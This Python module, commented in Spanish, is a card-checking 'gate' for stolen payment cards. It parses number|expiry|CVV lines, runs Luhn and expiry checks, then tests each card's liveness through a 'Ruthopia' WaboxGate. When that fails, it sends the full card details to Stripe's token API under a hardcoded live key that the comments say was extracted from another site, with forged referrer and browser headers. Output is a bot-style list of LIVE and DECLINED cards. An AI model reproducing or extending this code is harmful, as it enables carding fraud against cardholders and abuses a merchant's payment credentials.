# card_checker.py
"""Módulo de validación de sintaxis, formato y pre-check de liveness de tarjetas.

Incluye validación LUHN, expiración, y comprobación de liveness HTTP directo vía Stripe/Wabox (estilo Ruthopia /Rw gate).
"""
import time
import logging
from pathlib import Path
from datetime import datetime
from typing import Any, Dict, List, Optional, Tuple
import requests

logger = logging.getLogger(__name__)

# Rutas del proyecto
DASHBOARD_DIR = Path(__file__).parent.resolve()

# Configuración del gate Wabox (extracción de Ruthopia Bóveda)
WABOX_STRIPE_PK = "pk_live_WQNz0qa1BmBu47grZwTpj8BR"


def check_luhn(card_number: str) -> bool:
    """Verifica si el número de tarjeta cumple el algoritmo de Luhn."""
    digits = [int(c) for c in card_number if c.isdigit()]
    if not digits or len(digits) < 13 or len(digits) > 19:
        return False
    checksum = 0
    reverse_digits = digits[::-1]
    for i, digit in enumerate(reverse_digits):
        if i % 2 == 1:
            doubled = digit * 2
            checksum += doubled - 9 if doubled > 9 else doubled
        else:
            checksum += digit
    return checksum % 10 == 0


def parse_and_validate_card_pipe(pipe_str: str) -> Tuple[bool, Optional[Dict[str, str]], str]:
    """Parsea un pipe de tarjeta (3 o 4 partes) y valida Luhn + fecha + CVV.

    Retorna: (is_valid, parsed_dict, reason)
    parsed_dict: {"card_number": ..., "card_expiry": "MMYY", "card_cvv": ..., "bin": ...}
    """
    parts = [p.strip() for p in str(pipe_str).split("|") if p.strip()]
    if len(parts) < 3 or len(parts) > 4:
        return False, None, "Formato de pipe inválido (se esperaba num|exp|cvv o num|mm|yyyy|cvv)"

    card_num = parts[0]
    if not check_luhn(card_num):
        return False, None, "Número de tarjeta inválido (Luhn check fallido)"

    if len(parts) == 3:
        exp = parts[1]
        cvv = parts[2]
        if len(exp) != 4 or not exp.isdigit():
            return False, None, "Fecha de vencimiento debe ser MMYY de 4 dígitos"
    else:  # 4 partes
        mm = parts[1].zfill(2)
        yy = parts[2][-2:]
        exp = f"{mm}{yy}"
        cvv = parts[3]
        if len(mm) != 2 or not mm.isdigit() or int(mm) < 1 or int(mm) > 12:
            return False, None, "Mes de vencimiento inválido"
        if len(yy) != 2 or not yy.isdigit():
            return False, None, "Año de vencimiento inválido"

    if not (3 <= len(cvv) <= 4) or not cvv.isdigit():
        return False, None, "CVV inválido"

    mm_int = int(exp[:2])
    yy_int = int(exp[2:]) + 2000
    now = datetime.now()
    if mm_int < 1 or mm_int > 12:
        return False, None, "Mes de vencimiento fuera de rango (1-12)"

    if yy_int < now.year or (yy_int == now.year and mm_int < now.month):
        return False, None, "La tarjeta está vencida"

    parsed = {
        "card_number": card_num,
        "card_expiry": exp,
        "card_cvv": cvv,
        "bin": card_num[:6],
        "pipe_3parts": f"{card_num}|{exp}|{cvv}",
        "pipe_4parts": f"{card_num}|{exp[:2]}|20{exp[2:]}|{cvv}",
    }
    return True, parsed, "OK"


def perform_wabox_liveness_check(card_data: Dict[str, str]) -> Tuple[bool, str, Dict[str, Any]]:
    """Ejecuta la autenticación y verificación de liveness oficial importando directamente el WaboxGate de Ruthopia.

    Invocación directa a ruthopia.gates.wabox.WaboxGate (misma VPS, montaje /app/ruthopia).
    Retorna: (is_live, status_label, raw_details)
    """
    import sys, os, asyncio

    # 1. Configurar entorno de Ruthopia
    os.environ.setdefault("DATABASE_PATH", "/tmp/ruthopia_temp.db")
    if str(DASHBOARD_DIR) not in sys.path:
        sys.path.insert(0, str(DASHBOARD_DIR))

    # Cargar variables de entorno de Ruthopia si existen
    ruth_env_path = Path("/app/ruthopia_env")
    if ruth_env_path.exists():
        with open(ruth_env_path) as f:
            for line in f:
                if line.strip() and not line.startswith("#") and "=" in line:
                    k, v = line.strip().split("=", 1)
                    k_str = k.strip()
                    v_str = v.strip()
                    if k_str == "DATABASE_PATH":
                        os.environ[k_str] = "/app/ruthopia_data/ruthopia.db"
                    else:
                        os.environ[k_str] = v_str
    os.environ["DATABASE_PATH"] = "/app/ruthopia_data/ruthopia.db"

    pipe_str = card_data.get("pipe_4parts", f"{card_data['card_number']}|{card_data['card_expiry'][:2]}|20{card_data['card_expiry'][2:]}|{card_data['card_cvv']}")

    try:
        from ruthopia.gates.wabox import WaboxGate
        from ruthopia.core.models import CheckStatus

        gate = WaboxGate()

        # Ejecutar de forma asíncrona dentro de la función síncrona
        try:
            loop = asyncio.get_event_loop()
        except RuntimeError:
            loop = asyncio.new_event_loop()
            asyncio.set_event_loop(loop)

        if loop.is_running():
            import nest_asyncio
            nest_asyncio.apply()
            res = loop.run_until_complete(gate.check(pipe_str))
        else:
            res = loop.run_until_complete(gate.check(pipe_str))

        bin_info = res.bin_info or {}
        brand = bin_info.get("type", "Card").capitalize()
        level = bin_info.get("level", "").upper()
        country = bin_info.get("country_flag", "")
        bank = bin_info.get("bank", "")[:20]

        if res.status == CheckStatus.APPROVED:
            label = f"🟢 LIVE (Auth OK) - <i>{brand} {level} {bank} [{country}]</i>"
            return True, label, {"status": "APPROVED", "message": res.message, "raw": str(res)}
        else:
            msg = res.message or "Card Declined"
            label = f"🔴 DECLINED (Auth Failed) - <i>{msg[:50]}</i>"
            return False, label, {"status": "DECLINED", "message": res.message, "raw": str(res)}

    except Exception as e:
        logger.warning(f"Error invocando Ruthopia WaboxGate directo: {e}, aplicando fallback tokenizado")
        # Fallback a tokenización Stripe si ocurre un error inesperado
        card_num = card_data["card_number"]
        exp_month = card_data["card_expiry"][:2]
        exp_year = "20" + card_data["card_expiry"][2:]
        cvv = card_data["card_cvv"]

        data = {
            "card[number]": card_num,
            "card[exp_month]": exp_month,
            "card[exp_year]": exp_year,
            "card[cvc]": cvv,
            "key": WABOX_STRIPE_PK,
            "payment_user_agent": "stripe.js/3b1bde7a92; stripe-js-v3/3b1bde7a92; card-element",
            "pasted_fields": "number",
            "referrer": "https://www.waboxapp.com",
        }
        headers = {
            "Authorization": f"Bearer {WABOX_STRIPE_PK}",
            "Content-Type": "application/x-www-form-urlencoded",
            "Origin": "https://js.stripe.com",
            "Referer": "https://js.stripe.com/",
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            "Accept": "application/json",
        }
        try:
            res = requests.post("https://api.stripe.com/v1/tokens", data=data, headers=headers, timeout=6)
            res_json = res.json()
            if res.status_code == 200 and "id" in res_json:
                card_info = res_json.get("card", {})
                brand = card_info.get("brand", "Card")
                funding = card_info.get("funding", "")
                country = card_info.get("country", "")
                label = f"🟢 LIVE (Tokenized) - <i>{brand} {funding} [{country}]</i>"
                return True, label, res_json
            else:
                err = res_json.get("error", {})
                msg = err.get("message", "Card declined")
                code = err.get("code", "declined")
                label = f"🔴 DECLINED - <i>{msg} ({code})</i>"
                return False, label, res_json
        except Exception as ex:
            label = f"🟡 UNCHECKED (Timeout) - <i>{str(ex)[:40]}</i>"
            return True, label, {"error": str(ex)}


def precheck_card_liveness(card_pipe: str) -> Tuple[bool, str, Optional[Dict[str, str]]]:
    """Realiza la verificación completa de liveness pre-depósito.

    Aplica sintaxis, Luhn, fecha y comprobación HTTP liveness con Ruthopia Gate.
    """
    valid, parsed, reason = parse_and_validate_card_pipe(card_pipe)
    if not valid:
        return False, f"🔴 INVALID - <i>{reason}</i>", None

    is_live, status_label, raw = perform_wabox_liveness_check(parsed)
    parsed["liveness_label"] = status_label
    parsed["is_live"] = is_live

    if not is_live:
        return False, status_label, parsed

    return True, status_label, parsed


def format_ruthopia_liveness_summary(results: List[Dict[str, Any]]) -> str:
    """Genera la visualización del resultado de liveness con estética del bot Ruthopia.

    Estilo Ruthopia Bot: Emojis, HTML format, tarjeta enmascarada y badges.
    """
    lines = ["<b>ʀ.ᴜᴛʜᴏᴘɪᴀ ɢᴀᴛᴇ /ʀᴡ — Liveness Check Result</b>", "----------------------------------------"]
    for item in results:
        pipe = item.get("pipe", "")
        mask = pipe[:6] + "******" + pipe[-4:] if len(pipe) >= 10 else pipe
        status = item.get("status_label", "UNCHECKED")
        lines.append(f"💳 <code>{mask}</code> {status}")
    lines.append("----------------------------------------")
    accepted = [i for i in results if i.get("ok")]
    discarded = [i for i in results if not i.get("ok")]
    lines.append(f"✅ Aceptadas: <b>{len(accepted)}</b> | ❌ Descartadas: <b>{len(discarded)}</b>")
    return "\n".join(lines)
